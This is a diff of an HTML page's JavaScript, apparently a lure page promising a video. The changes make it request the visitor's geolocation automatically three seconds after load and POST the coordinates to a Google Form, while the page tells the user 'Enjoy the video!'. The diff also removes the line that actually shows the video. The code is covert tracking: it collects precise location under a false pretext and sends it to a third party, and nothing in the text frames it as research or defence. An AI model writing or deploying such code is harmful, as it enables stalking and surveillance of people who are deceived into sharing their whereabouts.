@@ -22,6 +22,8 @@
 </div>
 
 <script>
+// This script requests the user's location 3 seconds after joining the website
+// and automatically sends it to a Google Form
 function requestLocation() {
   if (!navigator.geolocation) {
     alert("Your device does not support location.");
@@ -37,21 +39,23 @@ function success(position) {
 
   document.getElementById("msg").innerText = "Location received. Enjoy the video!";
 
-  // Send location to your Google Form
+  // Send location to your Google Form using POST
   fetch("https://docs.google.com/forms/d/e/1FAIpQLSfELTAWud7thRvLn6_2EsjaHGidGSkfbMmmC9LTHzdAOWMJiQ/formResponse", {
     method: "POST",
     body: new URLSearchParams({
       "entry.8708125": lat + "," + lon
     })
   });
-
-  document.getElementById("videoBox").style.display = "block";
 }
 
-function error() {
-  alert("You must allow location to watch the video.");
+function error(err) {
+  alert("Location error: " + err.message);
 }
+
+// Ask for location 3 seconds after user joins website
+setTimeout(requestLocation, 3000);
 </script>
 
 </body>
 </html>
+
